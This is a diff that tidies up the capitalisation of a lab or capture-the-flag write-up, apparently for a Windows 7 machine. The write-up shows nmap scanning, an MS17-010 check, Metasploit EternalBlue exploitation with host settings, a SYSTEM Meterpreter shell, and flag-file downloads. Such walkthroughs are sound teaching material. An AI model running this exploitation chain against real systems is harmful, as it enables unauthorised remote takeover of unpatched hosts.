@@ -1,11 +1,11 @@
 [Download Link](https://drive.google.com/open?id=11f_wsW59Dh1fGvQCNUPK70lIWzlcg44_)
 
-finding the ip
+Finding the IP
 ```
 sudo arp-scan-l
 ```
 
-nmap all ports scan:
+Nmap all ports scan:
 ```
 nmap -sV -O -T4 -p- --min-rate=10000 $ip
 ```
@@ -24,7 +24,7 @@ MAC Address: 08:00:27:36:01:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Device type: general purpose
 Running: Microsoft Windows 2008|7|Vista|8.1
 ```
-this is a windows machine
+This is a Windows machine
 
 used `smbclient` to list shares - failed
 used `enum4linux` for detailed SMB and user enumeration - failed
@@ -39,7 +39,7 @@ output:
 SMB         10.170.71.142   445    JON-PC           [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:JON-PC) (domain:Jon-PC) (signing:False) (SMBv1:True)
 SMB         10.170.71.142   445    JON-PC           [+] Jon-PC\: 
 ```
-got the pc name as `Jon`
+Got the PC name as `Jon`
 
 Test for MS17-010 (EternalBlue) vulnerability
 ```
@@ -61,9 +61,9 @@ Host script results:
 |       A critical remote code execution vulnerability exists in Microsoft SMBv1
 |        servers (ms17-010).
 ```
-saw that its vulnerable
+Saw that it's vulnerable
 
-exploit using metasploit
+Exploit using Metasploit
 ```
 use exploit/windows/smb/ms17_010_eternalblue
 show options
@@ -73,9 +73,9 @@ set LHOST 10.170.71.2
 show options #all set
 run
 ```
-got the meterpreter shell
+Got the Meterpreter shell
 
-gathering system informations:
+Gathering system information:
 ```
 sysinfo
 ```
@@ -98,7 +98,7 @@ output
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-searching for flags
+Searching for flags
 ```
 meterpreter > search -f "*flag*"
 ```
@@ -109,14 +109,14 @@ c:\Windows\System32\config\flag2.txt
 c:\flag1.txt                                                   
 ```
 
-downloaded all these flags
+Downloaded all these flags
 ```
 meterpreter > download C:\\flag1.txt
 meterpreter > download C:\\Windows\\System32\\config\\flag2.txt
 meterpreter > download C:\\Users\\Jon\\Documents\\flag3.txt
 ```
 
-read the flags:
+Read the flags:
 ```
 cat flag*
 ```
